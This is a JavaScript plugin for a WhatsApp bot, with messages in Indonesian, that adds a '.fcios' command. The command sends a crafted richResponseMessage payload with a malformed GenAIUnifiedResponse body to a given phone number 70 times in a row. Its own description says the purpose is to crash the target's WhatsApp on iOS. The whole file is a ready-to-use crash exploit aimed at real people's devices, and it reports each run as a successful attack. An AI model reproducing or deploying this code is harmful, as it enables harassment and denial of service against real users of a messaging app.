import te from '../../src/lib/ichigo-error.js'
import { validateSocket, sendComposing, validateInternationalNumber } from '../../src/lib/ichigo-bug-socket.js'

const pluginConfig = {
    name: 'fcios',
    alias: ['fciosiyoto', 'iosbug'],
    category: 'bug',
    description: 'Mengirimkan payload richResponseMessage GenAI unified crash khusus target iOS secara beruntun',
    usage: '.fcios <nomor>',
    example: '.fcios 6283165537303',
    isOwner: true,
    isPremium: true,
    isGroup: false,
    isPrivate: false,
    cooldown: 100,
    energi: 50,
    isEnabled: true
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
}

async function fciosiyoto(sock, jid, jidList, extra = {}) {
    const payload = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    unifiedResponse: {
                        data: Buffer.from(
                            JSON.stringify({
                                __typename: "GenAIUnifiedResponse",
                                response_id: "Godline",
                                sections: [
                                    {
                                        __typename: "GenAIUnifiedResponseSection",
                                        view_model: Array.from({ length: 5 }, () => ({})),
                                    },
                                ],
                            })
                        ).toString("base64"),
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardOrigin: 4,
                        forwardedAiBotMessageInfo: {
                            botJid: "0@bot",
                        },
                    },
                },
            },
        },
    };

    const options = {
        statusJidList: jidList,
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: jidList.map((x) => ({
                            tag: "to",
                            attrs: { jid: x },
                        })),
                    },
                ],
            },
        ],
        ...extra,
    };

    return await sock.sendMessage(jid, payload, options);
}

async function handler(m, { sock, conn, args }) {
    const cli = await validateSocket(m, sock, conn)
    if (!cli) return

    const targetData = validateInternationalNumber(args[0])
    if (!targetData) {
        await sendComposing(cli, m.chat, 1000)
        return m.reply(
            `✖ *ERROR: INVALID NUMBER FORMAT*\n\n` +
            `Gunakan format nomor internasional yang valid.\n\n` +
            `> *Contoh:* \`${m.prefix}fcios +6283165537303\``
        )
    }

    if (m.react) await m.react('🩸').catch(() => {})

    try {
        await sendComposing(cli, m.chat, 1000)

        await cli.sendMessage(m.chat, {
            text: `┌  ⚙️  *OURIN // iOS CRASH SYSTEM*\n` +
                  `├  Target  :: \`+${targetData.clean}\`\n` +
                  `└  Status  :: Dispatching payloads...`
        }, { quoted: m }).catch(() => {})

        // Loop sebanyak 70 kali dengan delay 1 detik per pengiriman 
        for (let i = 1; i <= 70; i++) {
            await fciosiyoto(cli, targetData.jid, [targetData.jid]).catch(() => {})
            
            if (i < 70) await delay(1000)
        }

        await cli.sendPresenceUpdate('paused', m.chat).catch(() => {})
        if (m.react) await m.react('✅').catch(() => {})

        await cli.sendMessage(m.chat, {
            text: `┌  ✨  *OURIN // EXECUTION COMPLETE*\n` +
                  `├  Target  :: \`+${targetData.clean}\`\n` +
                  `└  Status  :: Payloads successfully delivered!`
        }, { quoted: m }).catch(() => {})

    } catch (e) {
        console.error("[fcios plugin error]", e)
        if (m.react) await m.react('❌').catch(() => {})
        return m.reply(te(m.prefix, m.command, m.pushName))
    }
}

export { pluginConfig as config, handler }
export default { config: pluginConfig, handler }